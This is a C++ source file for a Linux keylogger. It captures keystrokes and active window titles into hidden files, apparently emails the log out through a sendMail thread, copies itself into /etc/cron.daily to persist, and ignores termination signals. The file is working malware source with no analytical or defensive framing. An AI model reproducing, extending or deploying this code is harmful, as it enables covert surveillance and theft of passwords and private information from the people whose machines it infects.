/*_* gnu-g++ 4.8.4 build tool: g++ -o test key.cpp -lX11 *_*/
//#!/usr/bin/env g++ useless
#include <cstdlib>
#include <signal.h>
#include "KeyloggerLib.h"

void quit(int i)
{
  system("echo \"\\nUser:$USER try to kill the program\" >>.system");
}

int main()
{
  system("echo \"\\n`date`\">>.system");
  system("cp .system m.g");
  while(!checkInternet())
    sleep(10);
  pthread_t pt;
  pthread_create(&pt, NULL, sendMail, NULL);
  ///pthread_detach(pt);
  system("cp test /etc/cron.daily/ 2> /dev/null");
  signal(SIGINT, quit); //pour ctrl+c
  signal(SIGTERM, SIG_IGN); //this for kill cmd
  //fin.seekg(0,ios::end);
  system("echo \"\\n`date`\">.system");
  system("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | awk -F '\"' '{print $2}'>.AW");
  system("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | awk -F '\"' '{print $2}' >> .system");

	GetKeys(keyboardDevice);
  pthread_join(pt,NULL);

	return 0;
}
